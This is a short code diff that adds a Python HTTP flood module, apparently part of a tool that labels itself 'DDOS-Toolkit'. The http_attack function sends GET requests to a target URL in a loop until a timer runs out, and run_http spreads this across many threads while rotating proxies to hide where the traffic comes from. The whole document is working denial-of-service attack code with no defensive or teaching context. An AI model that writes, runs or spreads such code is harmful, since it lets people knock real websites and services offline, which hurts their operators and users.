@@ -1,0 +1,23 @@
+import threading
+import time
+import requests
+from utils.proxy_loader import load_proxies
+
+def http_attack(url, duration, proxy=None):
+    end_time = time.time() + duration
+    session = requests.Session()
+    headers = {"User-Agent": "Mozilla/5.0 (compatible; DDOS-Toolkit/1.0)"}
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+
+    while time.time() < end_time:
+        try:
+            session.get(url, headers=headers, proxies=proxies, timeout=3)
+        except:
+            continue
+
+def run_http(url, threads, duration, proxy_file=None):
+    proxies = load_proxies(proxy_file) if proxy_file else [None]
+    for i in range(threads):
+        proxy = proxies[i % len(proxies)]
+        t = threading.Thread(target=http_attack, args=(url, duration, proxy))
+        t.start()
